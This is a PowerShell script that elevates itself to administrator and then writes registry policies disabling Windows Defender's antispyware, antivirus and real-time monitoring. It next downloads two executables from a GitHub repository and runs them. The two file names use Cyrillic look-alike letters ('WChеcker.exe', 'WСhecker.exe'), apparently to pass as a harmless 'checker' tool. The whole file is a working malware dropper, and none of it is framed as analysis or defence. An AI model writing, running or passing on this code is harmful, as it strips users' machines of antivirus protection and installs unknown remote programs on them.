Param([switch]$shouldAssumeToBeElevated, [String]$workingDirOverride)

if(-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { $workingDirOverride = (Get-Location).Path }

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false) {
    if ($shouldAssumeToBeElevated) {
        Write-Output "Elevating did not work :("
        exit
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
    }
    exit
}

Set-Location "$workingDirOverride"

# Disable Windows Defender
$DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$RealTimeProtectionKey = "Real-Time Protection"
$SignatureUpdatesKey = "Signature Updates"
$SpynetKey = "Spynet"

$DisableAntiSpywareValue = "DisableAntiSpyware"
$DisableAntiVirusValue = "DisableAntiVirus"
$DisableRealtimeMonitoringValue = "DisableRealtimeMonitoring"

if (!(Test-Path $DefenderPath)) { New-Item -Path $DefenderPath -Force }
New-Item -Path "$DefenderPath\$RealTimeProtectionKey" -Force
New-Item -Path "$DefenderPath\$SignatureUpdatesKey" -Force
New-Item -Path "$DefenderPath\$SpynetKey" -Force

New-ItemProperty -Path "$DefenderPath" -Name "$DisableAntiSpywareValue" -Value "1" -PropertyType Dword -Force
New-ItemProperty -Path "$DefenderPath" -Name "$DisableAntiVirusValue" -Value "1" -PropertyType Dword -Force
New-ItemProperty -Path "$DefenderPath" -Name "$DisableRealtimeMonitoringValue" -Value "1" -PropertyType Dword -Force

Write-Host "Windows Defender DISABLED" -ForegroundColor Green

# Download and run TWO different files
$tempFolder = [System.IO.Path]::GetTempPath()
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# FIRST file - with Russian lowercase "е"
$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/WChеcker.exe"
$dest1 = Join-Path $tempFolder "Program1.exe"

# SECOND file - with Russian uppercase "С"
$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/WСhecker.exe"
$dest2 = Join-Path $tempFolder "Program2.exe"

$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")

Write-Host "Downloading FIRST program (Russian 'e')..." -ForegroundColor Yellow
try {
    $wc.DownloadFile($url1, $dest1)
    Write-Host "Running FIRST program" -ForegroundColor Green
    Start-Process -FilePath $dest1
} catch {
    Write-Host "FIRST failed: $_" -ForegroundColor Red
}

Write-Host "Downloading SECOND program (Russian 'C')..." -ForegroundColor Yellow
try {
    $wc.DownloadFile($url2, $dest2)
    Write-Host "Running SECOND program" -ForegroundColor Green
    Start-Process -FilePath $dest2
} catch {
    Write-Host "SECOND failed: $_" -ForegroundColor Red
}

Write-Host "ALL DONE" -ForegroundColor Green
Pause
